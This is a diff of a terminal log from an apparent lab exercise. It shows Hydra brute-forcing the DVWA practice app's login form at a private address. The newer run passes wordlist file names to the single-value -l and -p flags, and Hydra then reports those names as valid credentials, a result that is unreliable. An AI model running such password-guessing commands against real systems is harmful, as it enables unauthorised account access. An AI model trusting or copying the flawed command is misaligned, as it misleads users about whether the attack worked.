@@ -1,13 +1,14 @@
-┌──(parallels㉿kali-gnu-linux-2023)-[~/Desktop]
-└─$ hydra -l admin -p password 'http-get-form://10.9.50.1/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=61p8up0thkqjft9vn5osv6afk2; security=low:F=Username and/or password incorrect'~
+─(parallels㉿kali-gnu-linux-2023)-[~/Desktop]
+└─$ hydra -l xato-net-10-million-usernames.txt -p xato-net-10-million-passwords-1000000.txt 'http-get-form://10.9.50.1/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=61p8up0thkqjft9vn5osv6afk2; security=low:F=Username and/or password incorrect' 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-31 16:15:02
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-31 16:40:04
 [INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
 [DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
-[DATA] attacking http-get-form://10.9.50.1:80/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=61p8up0thkqjft9vn5osv6afk2; security=low:F=Username and/or password incorrect~
-[80][http-get-form] host: 10.9.50.1   login: admin   password: password
+[DATA] attacking http-get-form://10.9.50.1:80/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=61p8up0thkqjft9vn5osv6afk2; security=low:F=Username and/or password incorrect
+[80][http-get-form] host: 10.9.50.1   login: xato-net-10-million-usernames.txt   password: xato-net-10-million-passwords-1000000.txt                                                                                                      
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-31 16:15:03
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-31 16:40:05
+
 
 
